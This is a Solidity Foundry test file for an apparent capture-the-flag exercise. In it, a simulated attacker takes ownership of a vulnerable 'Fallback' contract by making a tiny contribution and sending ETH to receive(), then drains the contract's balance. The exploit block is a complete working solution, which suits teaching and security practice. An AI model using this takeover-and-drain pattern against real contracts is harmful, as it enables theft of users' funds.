// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {Fallback} from "../src/Fallback.sol";

contract FallbackTest is Test {
    Fallback public target;

    address public deployer = makeAddr("deployer");
    address public attacker = makeAddr("attacker");

    function setUp() public {
        // Deployer owns the contract and gets the huge 1000 ether contribution score.
        vm.startPrank(deployer);
        target = new Fallback();
        vm.stopPrank();

        // Give the contract some ETH to steal later.
        vm.deal(address(target), 2 ether);

        // Give the attacker ETH to play with.
        vm.deal(attacker, 1 ether);
    }

    function testExploit() public {
        // Win conditions:
        //   1. attacker becomes owner
        //   2. contract balance is drained to 0
        //
        // Hints (look at Fallback.sol carefully):
        //   - contribute() lets you register a small contribution (< 0.001 ether)
        //   - receive() sets owner = msg.sender IF you already contributed AND send ETH
        //   - withdraw() sends the whole balance to the current owner
        //
        // Tip: send ETH to receive() with:
        //   (bool ok,) = address(target).call{value: amount}("");
        //   require(ok);

        vm.startPrank(attacker);

        // ========== YOUR EXPLOIT HERE ==========
        target.contribute{value: 1 wei}();
        (bool ok,) = address(target).call{value: 1 wei}("");
        require(ok);
        target.withdraw();
        // ========== END EXPLOIT ==========

        vm.stopPrank();

        assertEq(target.owner(), attacker, "attacker should be owner");
        assertEq(address(target).balance, 0, "contract should be drained");
    }
}
